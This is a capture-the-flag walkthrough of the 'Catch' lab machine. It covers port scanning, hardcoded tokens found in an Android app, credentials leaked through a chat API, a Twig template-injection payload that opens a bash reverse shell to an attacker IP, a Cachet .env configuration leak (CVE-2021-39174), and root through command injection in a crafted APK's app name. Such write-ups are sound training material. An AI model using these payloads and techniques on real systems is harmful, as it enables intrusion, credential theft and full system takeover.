# Catch

![](images/catch.png)
IP: 10.129.183.178

## Recon
Running Nmap we can see 5 ports open, 22, 80,3000,5000 and 8000.
```
# Nmap 7.92 scan initiated Tue Mar 15 07:29:08 2022 as: nmap -sC -sV -p22,80,3000,5000,8000 -v -o nmap.txt 10.129.183.178
Nmap scan report for catch.htb (10.129.183.178)
Host is up (0.32s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Catch Global Systems
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=6b7b37f6602de4be; Path=/; HttpOnly
|     Set-Cookie: _csrf=QAiU-jroHV-NmmbX4qN-9IPZMxU6MTY0NzMwMDU1NDY5NTQ5NzcyMA; Path=/; Expires=Tue, 15 Mar 2022 23:29:14 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 14 Mar 2022 23:29:14 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Catch Repositories </title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=30c1714c5bca584e; Path=/; HttpOnly
|     Set-Cookie: _csrf=A6VzafovUhiaTkhCkKd75CaRTJQ6MTY0NzMwMDU2MTI3MzM5ODkyMA; Path=/; Expires=Tue, 15 Mar 2022 23:29:21 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 14 Mar 2022 23:29:21 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Location: /login
|     Vary: Accept, Accept-Encoding
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 28
|     Set-Cookie: connect.sid=s%3AjrQkRLgK5PKt6c7yGoffjbMu-4xH8zHg.93po1kdisJh366zk4rS%2BtVH4D9lL%2B67CPzVidXz0o0g; Path=/; HttpOnly
|     Date: Mon, 14 Mar 2022 23:29:19 GMT
|     Connection: close
|     Found. Redirecting to /login
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Set-Cookie: connect.sid=s%3AOGHjA8CMBfc-86qxjZxCfSPSA-aTGqpQ.r9%2B5HZWia1AloSYbXQs5gA6ZjTHK%2BRR2iDyGegRRWN4; Path=/; HttpOnly
|     Vary: Accept-Encoding
|     Date: Mon, 14 Mar 2022 23:29:22 GMT
|     Connection: close
|_    GET,HEAD
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Catch Global Systems
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: 69A0E6A171C4ED8855408ED902951594
|_http-server-header: Apache/2.4.29 (Ubuntu)

```

### Open Ports summary
| Port | Description             |
| ---- | ----------------------- |
| 22   | SSH                     |
| 80   | Android app static page |
| 3000 | Gitea Version: 1.14.1   |
| 5000 | Lets Chat               |
| 8000 | Cachet                  |

### Port 80
Browsing to http://10.129.183.178/ we see that it is a web page for a Android application. We can download the app clicking in the "Download Now" button.
![](images/image0.png)

### App Static Analysis
Using `jdx-gui` we can load the Android application and see its source code.
Looking in the `com.example.acatch.MainActivity` line 21, we see the app is trying to fetch the URL https://status.catch.htb/:
![](images/image1.png)

Lets add these entries to our `/etc/hosts` file:
```
10.129.183.178  catch.htb status.catch.htb
```

Another thing to note is the APK signature:
![](images/image2.png)
It seems that we have a developer name here: Will Robinson.

**Analysys with MOBSF**
Another useful tool for static/dynamic analysis is [MOBSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Lets add the .apk file into MOBSF and see the results.
One of the most interesting findings was harcoded secrets:
```
**POSSIBLE HARDCODED SECRETS**

"gitea_token" : "b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0"  
"lets_chat_token" : "NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="  
"slack_token" : "xoxp-23984754863-2348975623103"
```

Maybe we can use the Lets Chat token to authenticate on port 5000 and retrieve some data.

### Lets Chat
Lets Chat have a unique way of using the token as the user to authenticate and password can be anything but blank, I will use the word `password`.

Get rooms:
```bash
> curl --user NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==:password --request GET http://10.129.183.178:5000/rooms/
```
![](images/image3.png)

We get a list of rooms:
- Cachet Updates and Maintenance
- Android App Updates. Issues & More
- New Joinees. Org updates

Get Messages in the room "Cachet Updates and Maintenance":
``` bash
> curl --user NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==:password
 --request GET http://10.129.183.178:5000/rooms/61b86b28d984e2451036eb17/messages | jq .
```

Here we find a conversation between the user `john` and what seems to be the admin. The admin creates credentials for john and send it in the chat:
```json
{
    "id": "61b8702dfe190b466d476bfa",
    "text": "Here are the credentials `john :  E}V!mywu_69T4C}W`",
    "posted": "2021-12-14T10:21:33.859Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87010fe190b466d476bf9",
    "text": "Sure one sec.",
    "posted": "2021-12-14T10:21:04.635Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b86fb1fe190b466d476bf8",
    "text": "Can you create an account for me ? ",
    "posted": "2021-12-14T10:19:29.677Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b86f4dfe190b466d476bf6",
    "text": "Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ",
    "posted": "2021-12-14T10:17:49.761Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  }
```

It seems that the administrator created an account credentials for the user john:
```
john :  E}V!mywu_69T4C}W
```

## Exploitation
### Cachet
We can use john's credentials above to ligin to Cachet running on port 8000.
URL: http://10.129.184.153:8000/auth/login
Credentials: 
```
john:E}V!mywu_69T4C}W
```

Browsing the Cachet interface we can go to the "Settings" and it will reveal the application version:
![](images/image8.png)

### Exploitation of Cachet up to 2.4 dev
Looking on internet for vulnerabilities in this version we can find a very interesting [blog from Sonar](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection) that explains how to chain some vulnerabilities to trigger remote code execution. However, it did not work for me.

**Cachet Twig SSTI - UNINTENDED WAY**
One way to get a foothold in this machine was via Server-Side Template Injection.
Logged in as user `john` we can create an incident template and add a reverse shell to be triggered:
![](images/image10.png)
There is even a hint to use Twig syntax.
Payload:
```
{{["bash -c 'sh -i >& /dev/tcp/10.10.14.5/9001 0>&1'"]|filter("system")|join(",")}}
```

Now all we have to do is send a POST request to `/api/v1/incidents` with the template name we just created. It does not need to be authenticated to send this request:
```
POST /api/v1/incidents HTTP/1.1
Host:status.catch.htb:8000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
X-Cachet-Token:7GVCqTY5abrox48Nct8j
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

visible=0&status=1&name=caue&template=caue
```

And we receive the reverse shell:
![](images/image11.png)
And then we could find the credentials for `will` in the `.env` file:
![](images/image12.png)

#### CVE-2021-39174 - Configuration Leak
As mentioned in the article referenced before, we can take advantage of the fact that values of this file are displayed in the interface? 
This feature is convenient: by referencing another variable in an entry of the _dotenv_ configuration file and displaying this entry in the interface, it reveals another's variable value.

We can see in the Settings -> Mail, that "Mail From Address" is already populated with some value being fetched.
![](images/image9.png)

Lets change the email to some environment variable.
According to [Cachet documentation](https://docs.cachethq.io/docs/installing-cachet), the default `.env` file is the following:
```
APP_ENV=production
APP_DEBUG=false
APP_URL=http://localhost
APP_KEY=SomeRandomString

DB_DRIVER=mysql
DB_HOST=localhost
DB_DATABASE=cachet
DB_USERNAME=homestead
DB_PASSWORD=secret
DB_PORT=null

CACHE_DRIVER=apc
SESSION_DRIVER=apc
QUEUE_DRIVER=sync
CACHET_EMOJI=false

MAIL_DRIVER=smtp
MAIL_HOST=mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ADDRESS=null
MAIL_NAME="Demo Status Page"
MAIL_ENCRYPTION=tls

REDIS_HOST=null
REDIS_DATABASE=null
REDIS_PORT=null

GITHUB_TOKEN=null
```

We can try any of the above using the syntax `${VARIABLE}`.

Changing it to `${DB_PASSWORD}`  saving and reloading the page we get the database password. Later we change to `${DB_USERNAME}` we get the username.
```
${DB_PASSWORD} = s2#4Fg0_%3!
${DB_USERNAME} = will
```

## SSH as Will user
Using the credentials above we can login to SSH:
```
> ssh will@catch.htb
Password: s2#4Fg0_%3!
```

### Enumeration to privesc
Running pspy to monitor the processes and cron jobs we see:
![](images/image13.png)

The script at `/opt/mdm/verify.sh` is running as root every few minutes. Looking into the code we see the logic performing 3 checks.
One of them called `app_check()` is echoing the app name and is probably vulnerable to command injection if we modify a valid .apk file.
```bash verify.sh
...[snip]...
app_check() {
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup
                exit
        fi
}
...[snip]...
```

Another thing to note is the folders where the script will load the .apk:
```
...[snip]...
###################
# MDM CheckerV1.0 #
###################

DROPBOX=/opt/mdm/apk_bin
IN_FOLDER=/root/mdm/apk_bin
OUT_FOLDER=/root/mdm/certified_apps
PROCESS_BIN=/root/mdm/process_bin
...[snip]...
```

### Create an apk with command injection
Using the app we downloaded previously, we need to modify the value of `app_name` in `/res/values/strings.xml`:
![](images/image6.png)

We can decompile the original .apk file and add our command to make a copy of bash.
Decompile the apk:
```bash
> apktool d catchv1.0.apk
```

Modify the file `res/values/strings.xml` to ammend our command injection. I will make a copy of bash to /tmp folder and give it SUID permissions:
![](images/image5.png)

Compile the folder `catchv1.0/` back to .apk:
```bash
> apktool b catchv1.0 -o caue.apk
```

Generate a key to sign the apk:
```bash
> keytool -genkey -v -keystore demo.keystore -alias demokeys -keyalg RSA -keysize 2048 -validity 10000
```

Sign the .apk using jarsigner:
```bash
> jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore demo.keystore -storepass password caue.apk demokeys
```

Zipalign:
```bash
> zipalign 4 caue.apk caue-fix.apk
```

Now we upload `caue-fix.apk` to the machine and place it in `/opt/mdm/apk_bin` directory - as this is where the script will look for .apk - so it is processed by the `verify.sh` script.
In just a minute we get our bash with SUID bit:
![](images/image7.png)

## Root
We can simply execute the copy of bash in the `/tmp` folder to get a shell as `root`:
```
will@catch:/tmp$ ./rootbash -p
rootbash-5.0# id
uid=1000(will) gid=1000(will) euid=0(root) egid=0(root) groups=0(root),1000(will)
```

And we are root!